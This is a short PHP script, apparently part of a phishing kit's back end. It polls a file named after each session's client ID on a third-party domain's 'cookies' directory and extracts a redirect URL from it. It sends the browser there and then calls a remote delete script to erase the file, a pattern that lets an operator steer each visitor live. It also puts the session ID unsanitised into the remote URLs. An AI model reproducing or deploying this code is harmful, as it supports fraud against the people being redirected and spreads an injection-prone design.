<?php
session_start();

header('Content-Type: application/json');

$client_id = $_SESSION['client_id'];
$response = ['found' => false, 'redirect' => null];

if ($client_id) {
    $file_path = "https://tdsolutionsbelize.com/Tru2/src/cookies/$client_id.php";
    $headers = @get_headers($file_path);
    
    if ($headers && strpos($headers[0], '200') !== false) {
        $content = @file_get_contents($file_path);
        
        if ($content !== false && !empty($content)) {
            preg_match('/<meta[^>]*http-equiv=["\']refresh["\'][^>]*content=["\'][^"\']*URL=([^"\']+)["\'][^>]*>/i', $content, $matches);
            
            if (isset($matches[1])) {
                $response['found'] = true;
                $response['redirect'] = trim($matches[1]);
                $delete_url = "https://tdsolutionsbelize.com/Tru2/src/cookies/delete.php?file=$client_id.php";
                @file_get_contents($delete_url);
            }
        }
    }
}

echo json_encode($response);
?>